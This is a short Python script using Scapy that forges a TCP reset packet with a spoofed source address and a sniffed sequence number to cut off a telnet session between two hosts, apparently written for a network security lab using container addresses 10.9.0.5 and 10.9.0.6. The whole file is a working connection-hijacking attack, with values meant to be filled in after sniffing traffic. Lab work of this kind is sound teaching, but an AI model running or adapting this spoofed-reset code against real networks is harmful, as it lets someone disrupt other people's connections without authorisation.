#!/bin/python3
from scapy.all import *
from random import randrange
import sys

# Fill with values found during analysis
intSourcePort = 48638
intNextSequenceNumber = 4089193648

# Targeting victim/server container's telnet port
strSourceIP = "10.9.0.5"
strDestinationIP = "10.9.0.6"
intDestinationPort =  23

# Build the IP layer of the packet
lyrIP = IP(src=strSourceIP, dst=strDestinationIP)

# Build TCP layer of the packet
lyrTCP = TCP(sport=intDestinationPort, dport=intSourcePort, flags="R", seq=intNextSequenceNumber)

# Build the full packet and show it
pktResetPacket = lyrIP / lyrTCP
pktResetPacket.show()

# Send the packet
send(pktResetPacket, verbose=0)
